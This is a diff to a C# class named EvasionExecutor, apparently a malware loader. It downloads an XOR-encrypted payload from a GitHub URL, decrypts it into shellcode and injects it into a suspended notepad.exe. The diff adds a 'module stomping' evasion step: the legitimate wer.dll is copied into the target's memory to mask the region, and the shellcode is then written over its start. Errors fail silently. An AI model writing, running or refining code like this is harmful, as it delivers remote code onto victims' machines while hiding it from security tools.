@@ -9,8 +9,6 @@ public class EvasionExecutor
     #region Win32 Structures and Imports
     [StructLayout(LayoutKind.Sequential)]
     internal struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
-
-    // CORRECTED TYPO: LayoutGKind -> LayoutKind
     [StructLayout(LayoutKind.Sequential)]
     internal struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
 
@@ -18,7 +16,7 @@ public class EvasionExecutor
     [DllImport("kernel32.dll")] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll")] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
     [DllImport("kernel32.dll")] private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-    [DllImport("kernel32.dll")] private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    [DllImport("kernel32.dll")] private static extern uint ResumeThread(IntPtr hThread);
     [DllImport("kernel32.dll")] private static extern bool CloseHandle(IntPtr hObject);
     #endregion
 
@@ -34,43 +32,57 @@ public class EvasionExecutor
             byte[] encryptedPayload = client.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
             byte[] shellcode = new byte[encryptedPayload.Length];
             for (int i = 0; i < encryptedPayload.Length; i++) { shellcode[i] = (byte)(encryptedPayload[i] ^ xorKey[i % xorKey.Length]); }
-            if (shellcode != null && shellcode.Length > 0) { InjectAndExecute(shellcode); }
+            
+            if (shellcode != null && shellcode.Length > 0)
+            {
+                InjectAndExecute(shellcode);
+            }
         }
-        catch { }
+        catch { /* Fail silently */ }
     }
     
+    // --- New "Module Stomping" Injection Logic ---
     private void InjectAndExecute(byte[] shellcode)
     {
-        string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe"; 
+        // 1. Define the sacrificial process and the module to stomp.
+        string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe";
+        string moduleToStompPath = "C:\\Windows\\SysWOW64\\wer.dll"; // A non-essential, legitimate DLL.
         
         STARTUPINFO si = new STARTUPINFO();
         PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
         si.cb = (uint)Marshal.SizeOf(si);
-        si.dwFlags = 0x1;
-        si.wShowWindow = 0;
-
-        // Using CREATE_SUSPENDED to ensure we can inject before anything complex happens.
+        
+        // 2. Create the target process SUSPENDED to prevent it from running.
         bool success = CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
 
         if (success)
         {
-            IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
-            
-            // CORRECTED: Declared variables to handle the 'out' parameters instead of using '_'.
-            IntPtr bytesWritten;
-            uint threadId;
-
-            WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out bytesWritten);
-            
-            IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out threadId);
-
-            if(hThread != IntPtr.Zero)
+            try
             {
-                WaitForSingleObject(hThread, 0xFFFFFFFF);
-                CloseHandle(hThread);
-            }
+                // 3. Read the bytes of the legitimate DLL we are going to use as a mask.
+                byte[] legitModuleBytes = File.ReadAllBytes(moduleToStompPath);
+                
+                // 4. Allocate memory in the remote process the SAME SIZE as the DLL.
+                IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)legitModuleBytes.Length, 0x3000 /* MEM_COMMIT | MEM_RESERVE */, 0x40 /* PAGE_EXECUTE_READWRITE */);
+                
+                // 5. Write the ENTIRE legitimate DLL into the remote process. This makes the memory region look normal.
+                WriteProcessMemory(pi.hProcess, remoteAddr, legitModuleBytes, (uint)legitModuleBytes.Length, out _);
+
+                // 6. Now, "stomp" over the beginning of that memory with our actual shellcode.
+                WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out _);
+
+                // 7. Create the remote thread, starting execution at the beginning of our shellcode.
+                CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out _);
             
-            CloseHandle(pi.hProcess);
+                // 8. Finally, resume the main thread of the process.
+                ResumeThread(pi.hThread);
+            }
+            finally
+            {
+                // 9. Clean up handles after we are done.
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+            }
         }
     }
     
